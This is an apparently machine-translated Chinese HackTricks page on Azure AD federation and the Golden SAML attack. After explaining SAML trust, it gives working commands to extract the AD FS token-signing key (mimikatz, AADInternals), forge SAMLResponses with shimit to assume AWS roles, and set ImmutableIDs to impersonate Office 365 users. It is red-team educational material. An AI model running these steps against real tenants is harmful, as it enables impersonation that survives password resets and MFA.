# Az - 联合

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

[来自文档：](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**联合**是一组建立了**信任**的**域**集合。信任级别可能有所不同，但通常包括**身份验证**，几乎总是包括**授权**。典型的联合可能包括一些已经为**共享访问**建立了**信任**的**组织**。

您可以将您的**本地**环境**与Azure AD联合**，并使用此联合进行身份验证和授权。这种登录方法确保所有用户**身份验证发生在本地**。此方法允许管理员实施更严格的访问控制级别。可用的联合方式包括与**AD FS**和PingFederate的联合。

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

基本上，在联合中，所有**身份验证**发生在**本地**环境中，用户可以通过使用他们的**本地凭据**在所有受信任的环境中体验SSO。因此，用户可以通过使用他们的**本地凭据**访问**云**应用程序。

**安全断言标记语言（SAML）**用于在提供者之间**交换**所有身份验证和授权**信息**。

在任何联合设置中，有三方：

* 用户或客户端
* 身份提供者（IdP）
* 服务提供者（SP）

（图片来源：https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps）

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. 首先，用户访问一个应用程序（服务提供者或SP，如AWS控制台或vSphere Web客户端）。根据具体实现，此步骤可能被绕过，直接将客户端重定向到IdP（身份提供者）。
2. 随后，SP识别适当的IdP（例如，AD FS，Okta）进行用户身份验证。然后，它创建一个SAML（安全断言标记语言）AuthnRequest并将客户端重定向到所选的IdP。
3. IdP接管，对用户进行身份验证。身份验证后，IdP会生成一个SAMLResponse，并通过用户将其转发给SP。
4. 最后，SP评估SAMLResponse。如果验证成功，表示与IdP建立了信任关系，用户将获得访问权限。这标志着登录过程的完成，允许用户使用服务。

**如果您想了解更多关于SAML身份验证和常见攻击的信息，请访问：**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## 枢纽

* AD FS是基于声明的身份模型。
* "..声明只是关于用户的陈述（例如，名称，身份，组），主要用于授权访问分布在互联网任何地方的基于声明的应用程序。"
* 用户的声明写在SAML令牌中，然后由IdP签名以提供机密性。
* 用户由ImmutableID标识。它是全局唯一的，并存储在Azure AD中。
* ImmutableID存储在本地作为ms-DS-ConsistencyGuid的用户和/或可以从用户的GUID派生。
* 更多信息请参阅[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML攻击：**

* 在ADFS中，SAML响应由令牌签名证书签名。
* 如果证书被泄露，就有可能作为任何同步到Azure AD的用户进行身份验证！
* 就像我们的PTA滥用一样，更改用户的密码或多因素身份验证对我们没有任何影响，因为我们正在伪造身份验证响应。
* 证书可以从具有DA权限的AD FS服务器中提取，然后可以从任何连接到互联网的计算机中使用。
* 更多信息请参阅[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

**身份提供者（IdP）**生成**SAMLResponse**以授权用户登录的过程至关重要。根据IdP的具体实现，**响应**可能使用**IdP的私钥**进行**签名**或**加密**。此过程使服务提供者（SP）能够确认SAMLResponse的真实性，确保它确实是由受信任的IdP发出的。

可以将其与[黄金票据攻击](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)进行类比，其中用于验证用户身份和权限的关键（用于黄金票据的KRBTGT，用于黄金SAML的令牌签名私钥）可以被操纵以**伪造身份验证对象**（TGT或SAMLResponse）。这允许冒充任何用户，授予对SP的未经授权访问。

Golden SAML具有一定的优势：

* 它们可以**远程创建**，无需成为所讨论的域或联合的一部分。
* 即使启用了**双因素身份验证（2FA）**，它们仍然有效。
* 令牌签名**私钥不会自动更新**。
* **更改用户密码不会使**已生成的SAML失效。

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))是一项Microsoft服务，促进了受信任的商业合作伙伴之间的**身份信息安全交换**（联合）。它基本上允许域服务与联合中的其他服务提供者共享用户身份。

通过AWS信任受损的域（在联合中），可以利用此漏洞潜在地**获取AWS环境中的任何权限**。攻击需要**用于签署SAML对象的私钥**，类似于黄金票据攻击中需要KRBTGT。访问AD FS用户帐户足以获取此私钥。

执行Golden SAML攻击的要求包括：

* **令牌签名私钥**
* **IdP公钥证书**
* **IdP名称**
* **角色名称（要承担的角色）**
* 域\用户名
* AWS中的角色会话名称
* 亚马逊账户ID

_只有粗体项是必需的。其他项目可以根据需要填写。_

要获取**私钥**，需要访问**AD FS用户帐户**。然后，可以使用诸如[mimikatz](https://github.com/gentilkiwi/mimikatz)之类的工具从个人存储中**导出私钥**。要收集其他所需信息，可以使用Microsoft.Adfs.Powershell snapin，确保您以ADFS用户身份登录：
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
带着所有信息，有可能会忘记一个有效的SAMLResponse，作为你想要冒充的用户使用[**shimit**](https://github.com/cyberark/shimit)**:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### 本地 -> 云
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
也可以创建仅在云中存在的用户的ImmutableID并冒充他们
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## 参考资料

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
